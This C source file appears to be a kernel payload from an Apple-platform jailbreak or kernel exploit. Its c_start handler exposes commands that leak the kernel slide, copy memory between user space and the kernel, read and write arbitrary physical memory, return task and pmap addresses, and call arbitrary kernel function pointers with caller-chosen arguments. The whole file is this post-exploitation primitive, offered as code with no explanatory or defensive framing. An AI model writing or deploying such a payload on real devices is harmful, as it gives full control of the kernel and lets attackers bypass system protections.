#import <stdio.h>
#import <stdlib.h>
#import <dlfcn.h>

#define kern_return_t uint32_t

uint64_t getKernelSlide(void);

kern_return_t copyin(const user_addr_t uaddr, void *kaddr, size_t len);
kern_return_t copyout(const void *kaddr, user_addr_t udaddr, size_t len);
uint64_t current_task(void);
uint64_t get_task_pmap(uint64_t task);

uint64_t pmap_find_phys(uint64_t pmap, uint64_t va);
void bcopy_phys(uint64_t from, uint64_t to, size_t bytes);

uint64_t vtophys(uint64_t pmap, uint64_t va) {
    return (pmap_find_phys(pmap, va) << 0xe) | (va & 0x3fff);
}

int physcopy(uint64_t pa, uint64_t data, size_t size, int direction) {
    uint64_t data_pa = vtophys(get_task_pmap(current_task()), data);
    if (data_pa == 0) return 0;
    bcopy_phys(direction ? pa : data_pa, direction ? data_pa : pa, size);
    return 1;
}

uint64_t c_start(uint64_t* args) {
    uint64_t command = args[0];
    uint64_t arg1 = args[1];
    uint64_t arg2 = args[2];
    uint64_t arg3 = args[3];
    
    if (command == 0x41) return 0x41424344;
    if (command == 0) return getKernelSlide();
    if (command == 1) return copyout((void*)arg1, arg2, arg3);
    if (command == 2) return copyin(arg2, (void*)arg1, arg3);
    if (command == 3) return physcopy(arg1, arg2, arg3, 1); // physreadbuf
    if (command == 4) return physcopy(arg1, arg2, arg3, 0); // physwritebuf
    if (command == 5) {
        uint64_t kcall_args[8] = {0};
        copyin(arg3, kcall_args, sizeof(kcall_args));
        uint64_t (*func)(uint64_t arg1, uint64_t arg2, uint64_t arg3, uint64_t arg4, uint64_t arg5, uint64_t arg6, uint64_t arg7, uint64_t arg8) = (void*)arg1;
        uint64_t ret = func(kcall_args[0], kcall_args[1], kcall_args[2], kcall_args[3], kcall_args[4], kcall_args[5], kcall_args[6], kcall_args[7]);
        if (arg2) copyout(&ret, arg2, 8);
        return 0;
    }
    if (command == 6) {
        uint64_t task = current_task();
        if (arg1) copyout(&task, arg1, 8);
        return 0;
    }
    if (command == 7) {
        uint64_t pmap = get_task_pmap(arg1);
        if (arg2) copyout(&pmap, arg2, 8);
        return 0;
    }
    if (command == 8) {
        uint64_t phys = vtophys(arg1, arg2);
        if (arg3) copyout(&phys, arg3, 8);
        return 0;
    }
    return 0;
}
